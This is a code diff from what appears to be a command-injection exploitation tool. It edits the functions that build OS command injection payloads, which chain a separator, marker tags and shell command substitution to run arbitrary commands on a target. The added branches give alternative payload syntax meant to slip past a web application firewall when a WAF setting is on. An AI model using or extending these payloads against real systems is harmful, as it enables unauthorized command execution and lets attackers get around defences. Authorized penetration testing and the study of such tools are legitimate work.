@@ -31,10 +31,14 @@ def decision(separator, TAG, randv1, randv2):
               "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
               "\"') do @set /p = " + TAG + "%i" + TAG + TAG + " <nul"
               )
-  else:  
+  else:
+    if not settings.WAF_ENABED:
+      math_calc = "$((" + str(randv1) + "%2B" + str(randv2) + "))"
+    else:
+      math_calc = "$(expr " + str(randv1) + " %2B " + str(randv2) + ")"
     payload = (separator +
               "echo " + TAG +
-              "$((" + str(randv1) + "%2B" + str(randv2) + "))"  +
+              math_calc + 
               "$(echo " + TAG + ")" + TAG + ""
                ) 
   return payload
@@ -66,11 +70,15 @@ def cmd_execution(separator, TAG, cmd):
               cmd + 
               "') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + " <nul"
               )
-  else:          
+  else:       
+    if not settings.WAF_ENABED:
+      cmd_exec = "$(echo $(" + cmd + "))"
+    else:
+      cmd_exec = "$(" + cmd + ")"
     payload = (separator +
               "echo " + TAG +
               "$(echo " + TAG + ")" +
-              "$(echo $(" + cmd + "))" +
+              cmd_exec +
               "$(echo " + TAG + ")" + TAG + ""
               )
   return payload
